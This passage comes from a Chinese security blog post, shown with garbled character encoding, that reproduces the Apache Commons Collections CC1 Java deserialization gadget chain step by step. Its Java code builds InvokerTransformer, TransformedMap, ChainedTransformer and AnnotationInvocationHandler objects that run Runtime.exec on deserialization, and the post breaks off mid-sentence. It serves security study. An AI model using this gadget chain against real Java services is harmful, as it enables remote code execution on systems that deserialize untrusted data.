title="InvokerTransformer"></a>InvokerTransformer</h5><p>åœ¨<code>InvokerTransformer</code>ç±»ä¸­å­˜åœ¨ä¸‰ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§transformæ–¹æ³•ä¸­çš„è°ƒç”¨æ–¹å¼ä¼ å€¼å°±å¯ä»¥äº†ã€‚æ”¹å†™åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œæ˜¯<code>InvokerTransformer.transform</code>è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒæ˜¯ä¸€ä¸ªå±é™©æ–¹æ³•ï¼Œæ¥ç€æˆ‘ä»¬å‘ä¸Šç»§ç»­æ‰¾è¿˜æœ‰å“ªäº›è°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼Œæœ€å¥½æ˜¯ä¸åŒåçš„</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/4.png" alt="4"></p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>æ³¨æ„åˆ°<code>TransformedMap</code>è¿™ä¸ªç±»ï¼Œå› ä¸ºåœ¨è¿™ä¸ªç±»ä¸­æœ‰å¥½å‡ å¤„éƒ½è°ƒç”¨äº†<code>transform</code>è¿™ä¸ªæ–¹æ³•ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/5.png" alt="5"></p><p>è·Ÿè¿›<code>checkSetValue</code>æ–¹æ³•ï¼Œ å‘ç°è°ƒç”¨äº†<code>valueTransformer</code>çš„<code>transform</code>æ–¹æ³•</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/6.png" alt="6"></p><p>æ‰¾åˆ°<code>TransformedMap</code>çš„æ„é€ å‡½æ•°ï¼Œå‘ç°ä¼ å…¥äº†ä¸€ä¸ª<code>map</code>å’Œä¸¤ä¸ª<code>Transformer</code>ï¼Œå¯ä»¥ç†è§£ä¸ºæ¥å—ä¸€ä¸ª<code>map</code>å¹¶å¯¹è¿™ä¸ª<code>map</code>çš„<code>key</code>å’Œ<code>value</code>åšä¸€äº›æ“ä½œï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªä¿æŠ¤æ–¹æ³•ï¼Œ æˆ‘ä»¬ç»§ç»­æ‰¾ä¸€ä¸‹åœ¨å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/7.png" alt="7"></p><p>åœ¨æ„é€ æ–¹æ³•ä¸Šé¢æ‰¾åˆ°äº†<code>decorate</code>é™æ€æ–¹æ³•</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/8.png" alt="8"></p><p>æ¥ç€æˆ‘ä»¬å‘ä¸ŠæŸ¥æ‰¾å“ªäº›è°ƒç”¨äº†<code>checkSetValue</code>æ–¹æ³•ï¼Œå‘ç°åªæœ‰ä¸€å¤„è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/9.png" alt="9"></p><p>å‘ç°æ˜¯<code>AbstractInputCheckedMapDecorator</code>ç±»ä¸­æœ‰ä¸€ä¸ª<code>MapEntry</code>ç±»ï¼Œè¿™ä¸ªç±»è°ƒç”¨äº†<code>setValue</code>æ–¹æ³•</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/10.png" alt="10"></p><h5 id="MapEntry"><a href="#MapEntry" class="headerlink" title="MapEntry"></a>MapEntry</h5><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ¢³ç†ä¸€éï¼Œå½“æˆ‘ä»¬éå†è¢«ä¿®é¥°çš„<code>Map</code>çš„æ—¶å€™ï¼Œå°±ä¼šèµ°åˆ°<code>setValue</code>è¿™ä¸ªæ–¹æ³•ï¼Œä»è€Œä¼šè°ƒç”¨<code>checkSetValue</code>ï¼Œæ¥ç€è°ƒç”¨åˆ°äº†<code>valueTransformer.transform</code>æ–¹æ³•ï¼Œä¹‹åå°±ä¼šèµ°åˆ°<code>InvokerTransformer.transform</code>æ–¹æ³•æ‰§è¡Œ</p><p>æˆ‘ä»¬å†æ¬¡å°è¯•æ”¹å†™ä¸Šé¢çš„ä¾‹å­ï¼Œé¦–å…ˆå®ä¾‹åŒ–ä¸€ä¸ª<code>map</code>å¯¹è±¡ï¼Œå¹¶å¯¹<code>map</code>è¿›è¡Œè£…é¥°ï¼Œå› ä¸ºåœ¨åé¢æ‰§è¡Œ<code>transform</code>æ–¹æ³•çš„æ˜¯<code>decorate</code>æ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç»™ç¬¬äºŒä¸ªå‚æ•°ä¼ ä¸€ä¸ªç©ºå€¼ï¼Œä¹‹åé€šè¿‡<code>for</code>å¾ªç¯è°ƒç”¨<code>setValue</code>æ–¹æ³•å°†æˆ‘ä»¬çš„<code>Runtime.getRuntime()</code>å¯¹è±¡ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="jdkæºç å…³è”"><a href="#jdkæºç å…³è”" class="headerlink" title="jdkæºç å…³è”"></a>jdkæºç å…³è”</h5><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ç»§ç»­å‘ä¸Šå¯»æ‰¾è°ƒç”¨é“¾ï¼Œçœ‹å“ªäº›ç±»è°ƒç”¨äº†<code>setValue</code>æ–¹æ³•ï¼ŒæŒ‰ç…§æµç¨‹ï¼Œæˆ‘åº”è¯¥èƒ½æ‰¾åˆ°åœ¨<code>AnnotationInvocationHandler</code>è¿™ä¸ªç±»çš„<code>readObject</code>æ–¹æ³•é‡Œé¢è°ƒç”¨äº†<code>setValue</code>æ–¹æ³•ï¼Œå¯æ˜¯æ‰¾äº†ä¸€åœˆï¼Œå¹¶æ²¡æœ‰ã€‚ã€‚ã€‚æˆ‘ä»¥ä¸ºæ˜¯æˆ‘jdkç‰ˆæœ¬çš„é—®é¢˜ï¼Œäºæ˜¯åœ¨jdkä¸‹é¢æŸ¥çœ‹ï¼Œè·¯å¾„æ˜¯<code>rt.jar</code>ä¸‹é¢çš„<code>sun.reflect.annotation</code>ï¼Œå‘ç°è¿™ä¸ªç±»ä¸æ˜¯æºä»£ç ï¼Œæ‰€ä»¥æŸ¥æ‰¾è°ƒç”¨çš„æ—¶å€™ä¸ä¼šå‡ºç°ã€‚</p><p>å¯¹äºè¿™ä¸ªé—®é¢˜æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹åˆç†çš„è§£ç­”ï¼šå› ä¸ºsunåŒ…æ˜¯hotspotè™šæ‹Ÿæœºä¸­java.<em> å’Œjavax.</em>çš„åº•å±‚å®ç°ã€‚å› ä¸ºåŒ…å«åœ¨rtä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥è°ƒç”¨ã€‚ä½†æ˜¯å› ä¸ºä¸æ˜¯sunå¯¹å¤–å…¬å¼€æ‰¿è¯ºçš„æ¥å£ï¼Œæ‰€ä»¥æ ¹æ®å®ç°çš„éœ€è¦éšæ—¶å¢å‡ï¼Œå› æ­¤åœ¨ä¸åŒç‰ˆæœ¬çš„hotspotä¸­å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œè€Œä¸”åœ¨å…¶ä»–çš„jdkå®ç°ä¸­æ˜¯æ²¡æœ‰çš„ï¼Œè°ƒç”¨è¿™äº›ç±»ï¼Œå¯èƒ½ä¸ä¼šå‘åå…¼å®¹ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸æ¨èä½¿ç”¨ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥çœ‹<code>rt.jar</code>åŒ…ä¸‹çš„æºç å°±éœ€è¦è¿›è¡Œæºç å…³è”ã€‚</p><p>JDK-7u6æºä»£ç åœ°å€ï¼š<a href="http://jdk7src.sourceforge.net" target="_blank" rel="noopener">http://jdk7src.sourceforge.net</a></p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/24.png" alt="24"></p><p>ä¸‹è½½å¥½å¯¹åº”JDKç‰ˆæœ¬ä¹‹åï¼Œåœ¨IDEAä¸­å°±å¯ä»¥è®¾ç½®ã€‚è¿›å…¥<code>File-&gt;Project Structrue-&gt;SDKs-&gt;Sourcepath</code>ä¸­æ·»åŠ å³å¯</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/11.png" alt="11"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†æ¬¡æŸ¥çœ‹<code>AnnotationInvocationHandler</code>è¿™ä¸ªç±»ï¼Œå‘ç°å·²ç»æ˜¯æºä»£ç æ–‡ä»¶äº†ï¼ŒåŒæ ·ä¹Ÿåœ¨<code>setValue</code>æ”¾çš„çš„è°ƒç”¨ç±»ä¸­æˆåŠŸæ‰¾åˆ°äº†è¿™ä¸ªç±»</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/12.png" alt="12"></p><h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ç»§ç»­ä¿®æ”¹æˆ‘ä»¬ä¸Šé¢å†™çš„ä¾‹å­ï¼Œå°†<code>AnnotationInvocationHandler</code>ç±»åŠ è¿›å»ï¼Œå°è¯•å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œä½†æ˜¯ç”±äºè¯¥ç±»ä¸æ˜¯<code>public</code>çš„ï¼Œä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œå› æ­¤éœ€è¦ç”¨åˆ°åå°„å»è·å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor annotationInvocationHandler = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = annotationInvocationHandler.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="é‡åˆ°çš„ä¸‰ä¸ªé—®é¢˜"><a href="#é‡åˆ°çš„ä¸‰ä¸ªé—®é¢˜" class="headerlink" title="é‡åˆ°çš„ä¸‰ä¸ªé—®é¢˜"></a>é‡åˆ°çš„ä¸‰ä¸ªé—®é¢˜</h5><p>è¿™é‡Œå°±ä¼šé‡åˆ°ä¸‰ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯<code>setValue</code>ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬<code>setValue</code>çš„å€¼ç›´æ¥ä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>Runtime</code>å¯¹è±¡ï¼Œä½†æ˜¯åœ¨<code>AnnotationInvocationHandler</code>ç±»ä¸­ï¼Œè¿™ä¸ªä¼ å…¥çš„å€¼å¹¶ä¸æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/13.png" alt="13"></p><p>ç¬¬äºŒä¸ªé—®é¢˜æ˜¯å¯¹äº<code>Runtime</code>ç±»ï¼Œå®ƒå¹¶ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ç»§æ‰¿<code>Serializable</code>æ¥å£ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿéœ€è¦é€šè¿‡åå°„æ¥å®ç°ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/14.png" alt="14"></p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜æ˜¯è¿›å…¥<code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject</code>æ–¹æ³•ä¸­çš„<code>setValue</code>æ–¹æ³•éœ€è¦æ»¡è¶³ä¸¤ä¸ªifæ¡ä»¶ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/15.png" alt="15"></p><h5 id="åå°„è°ƒç”¨Runtime"><a href="#åå°„è°ƒç”¨Runtime" class="headerlink" title="åå°„è°ƒç”¨Runtime"></a>åå°„è°ƒç”¨Runtime</h5><p>æˆ‘ä»¬å…ˆè§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå°†<code>Runtime</code>å¯¹è±¡é€šè¿‡åå°„å®ç°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>; <span class="comment">//é€šè¿‡åå°„è·å–åˆ°å­—èŠ‚ç å¯¹è±¡</span></span><br><span class="line">        Method getRuntimeMethod = c.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>); <span class="comment">//è·å–getRuntimeé™æ€æ–¹æ³•</span></span><br><span class="line">        Runtime r = (Runtime) getRuntimeMethod.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>); <span class="comment">//è·å–Runtimeå¯¹è±¡</span></span><br><span class="line">        Method execMethod = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">        execMethod.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬æŠŠè¿™ä¸ªåå°„è°ƒç”¨æ”¹æˆ<code>InvokerTransformer</code>çš„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;).transform(Runtime.class);</span><br><span class="line">        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå®é™…ä¸Šæ˜¯å¯¹<code>InvokerTransformer</code>ç±»çš„<code>transform</code>æ–¹æ³•è¿ç»­è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œä¸ç”±æƒ³åˆ°åœ¨ä¹‹å‰çš„<code>Transformer</code>çš„å®ç°ç±»ä¸­æœ‰ä¸€ä¸ª<code>ChainedTransformer</code>ï¼Œåœ¨å®ƒçš„<code>transform</code>æ–¹æ³•ä¸­å°±æ˜¯ä¸€ä¸ªå¾ªç¯è°ƒç”¨çš„å½¢å¼ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/16.png" alt="16"></p><p>å› æ­¤æˆ‘ä»¬å°è¯•ä½¿ç”¨<code>ChainedTransformer</code>ç±»è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeReflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">      chainedTransformer.transform(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Target-class"><a href="#Target-class" class="headerlink" title="Target.class"></a>Target.class</h5><p>æ¥ç€æˆ‘ä»¬ç»§ç»­ä¿®æ”¹ä¸¤ä¸ªifåˆ¤æ–­çš„é—®é¢˜ã€‚åœ¨ç¬¬ä¸€ä¸ªifä¹‹å‰é¦–å…ˆä¼šéå†æˆ‘ä»¬ä¼ å…¥çš„mapå¹¶å°†keyèµ‹ç»™nameï¼Œæ­¤æ—¶æˆ‘ä»¬æ‹¿åˆ°çš„nameå°±æ˜¯åœ¨mapä¸­putçš„<code>key</code>ï¼Œä¹‹åä¼šé€šè¿‡<code>memberTypes.get</code>æ–¹æ³•è·å–nameï¼Œå°†å€¼èµ‹ç»™memberTypeã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/17.png" alt="17"></p><p>ç”±äºæˆ‘ä»¬ç°åœ¨ä¼ å…¥çš„æ˜¯<code>Override.class</code>ï¼Œåœ¨<code>Override</code>ä¸­å¹¶æ²¡æœ‰å­˜åœ¨æˆå‘˜æ–¹æ³•ï¼Œå› æ­¤åœ¨getçš„æ—¶å€™å°±æ‹¿ä¸åˆ°ä»»ä½•å€¼ï¼Œæ‰€ä»¥å¾—åˆ°çš„<code>memberType</code>å°±ä¸ºç©ºã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/18.png" alt="18"></p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/20.png" alt="20"></p><p>å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªæœ‰æˆå‘˜æ–¹æ³•çš„classï¼Œå¹¶å°†mapä¼ å…¥çš„<code>key</code>å€¼æ”¹ä¸ºæˆå‘˜æ–¹æ³•çš„åå­—ï¼Œæ‰å¯ä»¥è¿›å…¥ç¬¬ä¸€å±‚ifåˆ¤æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>Target.class</code>ä»£æ›¿ï¼Œå¹¶å°†<code>map.put</code>çš„<code>key</code>å€¼æ”¹ä¸º<code>value</code></p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/19.png" alt="19"></p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/21.png" alt="21"></p><p>åœ¨ç¬¬äºŒä¸ªåˆ¤æ–­è¯­å¥ä¸­ä½¿ç”¨<code>isInstance</code>åˆ¤æ–­æ˜¯å¦å¯ä»¥å¼ºè½¬ï¼Œè¿™ä¸ªåˆ¤æ–­å¾ˆæ˜æ˜¾æ˜¯<code>false</code>,å–åä¹‹åæ­£å¥½å¯ä»¥è®©æˆ‘ä»¬è¿›å…¥ç¬¬äºŒå±‚ifåˆ¤æ–­ï¼Œä»è€Œæ‰§è¡Œ<code>setValue</code>æ–¹æ³•</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>ç°åœ¨æˆ‘ä»¬æ¥ç€è§£å†³ä¸Šé¢çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯éœ€è¦å°†<code>setValue</code>ä¸­çš„ä»£ç†æ›¿æ¢æˆæˆ‘ä»¬çš„<code>Runtime.class</code>ï¼Œå¯ä»¥é€šè¿‡<code>ConstantTransformer</code>å®ç°ã€‚å‰é¢è®²åˆ°äº†<code>ConstantTransformer</code>çš„<code>transform</code>æ–¹æ³•æ¥æ”¶ä¸€ä¸ªè¾“å…¥å¹¶è¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦ä¼ 